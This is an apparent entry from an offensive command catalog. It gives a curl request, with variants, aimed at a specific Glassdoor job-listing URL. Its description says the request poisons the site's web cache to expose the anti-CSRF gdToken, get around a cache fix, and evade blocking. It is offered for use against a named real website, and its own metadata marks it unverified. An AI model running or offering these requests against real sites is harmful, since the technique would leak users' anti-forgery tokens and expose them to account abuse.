---
id: c-cache-poisoning-token
data: >-
  curl -X GET "https://www.glassdoor.com/job-listing/011.js?jl=1007452474740" -H
  "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -v
tags:
  - web-cache-poisoning
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.745Z'
verified: false
validated: true
submitted: true
---
# cache-poisoning-token-exposure

## Command

```bash
curl -X GET "https://www.glassdoor.com/job-listing/011.js?jl=1007452474740" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -v
```

## Description

This command sends a GET request to a manipulated URL on Glassdoor to poison the web cache and expose the Anti-CSRF gdToken. Use it to bypass cache fixes by leveraging .js extensions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `URL` | Target poisoned endpoint with .js and jl parameter | Yes |
| `-H User-Agent` | Mimics browser to avoid blocking | Yes |
| `-v` | Verbose output for headers and cache info | Yes |
| `jl` | Job listing ID parameter (e.g., 1007452474740) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.glassdoor.com/job-listing/011.js?jl=1007452474740" -H "User-Agent: Mozilla/5.0" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.glassdoor.com/job-listing/011.js?jl=1007452474740" -H "User-Agent: Mozilla/5.0" -H "Referer: https://www.glassdoor.com" -v
```

## Expected Output

HTTP/2 200 OK response with body containing gdToken (e.g., a JSON-like structure with token value). Cache-Control headers indicate storage; subsequent requests from other IPs return the same sensitive data.

## Related

- [[Related Procedure: Bypass-Web-Cache-Poisoning-Fix-to-Expose-gdToken]]
